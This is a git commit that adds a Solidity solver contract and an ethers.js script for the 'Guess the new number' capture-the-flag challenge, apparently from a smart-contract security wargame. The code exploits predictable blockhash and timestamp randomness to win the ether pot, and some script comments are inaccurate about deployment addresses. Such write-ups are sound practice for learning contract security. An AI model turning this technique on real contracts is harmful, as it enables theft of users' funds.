fab84e9d3ff5bd4fe0563bd522fcb10aba03909a
phcxc <h499871809@gmail.com>
2022-04-28 22:29:27 +0800

    Guess the new number solution

---
+++ src/contracts/GuessTheNewNumberSolver.sol
@@ -0,0 +1,35 @@
+// SPDX-License-Identifier: GPL-3.0
+pragma solidity ^0.8.7;
+
+interface IGuessTheNewNumberChallenge {
+    function guess(uint8 number) external payable;
+}
+
+contract GuessTheNewNumberSolver {
+     event Received(address, uint);
+    IGuessTheNewNumberChallenge public challenge;
+    address payable private owner;
+
+    constructor(address _challengeAddress) {
+        challenge = IGuessTheNewNumberChallenge(_challengeAddress);
+        owner = payable(msg.sender);
+    }
+
+    function solve() public payable {
+        require(msg.sender == owner, "Only the owner can solve this challenge");
+        require(msg.value == 1 ether, "You must send 1 ether to solve this challenge");
+        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
+        challenge.guess{value: msg.value}(answer);
+        payable(msg.sender).transfer(address(this).balance);
+    }
+
+    function destroy() public {
+        require(msg.sender == owner, "Only the owner can destroy this contract");
+		selfdestruct(payable(msg.sender)); 
+	}
+
+    receive() external payable {
+          emit Received(msg.sender, msg.value);
+    }
+
+}
---
+++ src/guess-the-new-number.js
@@ -0,0 +1,29 @@
+
+const { utils, Contract } = require('ethers');
+
+var { wallet, provider } = require('./common')
+
+// the solve contract
+// you should deploy the contract under the same account as the challenge contract
+// the solve contract should be deployed to the same address as the challenge contract
+// the contract could be found under the src/contracts/GuessTheNewNumberSolver.sol file
+const contractAddress = '0xbA2C6382d99505c24D65559839514b0222792154';
+
+async function main() {
+	const iface = new utils.Interface([
+		'function destroy()',
+		'function solve() payable',
+		'constructor(address _challengeAddress)',
+		'function challenge() view returns (address)'
+	]);
+	var contract = new Contract(contractAddress, iface, provider);
+	let contractWithSigner = contract.connect(wallet);
+	const options = { value: utils.parseEther("1.0") }
+	let tx = await contractWithSigner.solve(options);
+
+	var result = await tx.wait();
+	console.log(result);
+}
+
+
+main().catch(console.error);
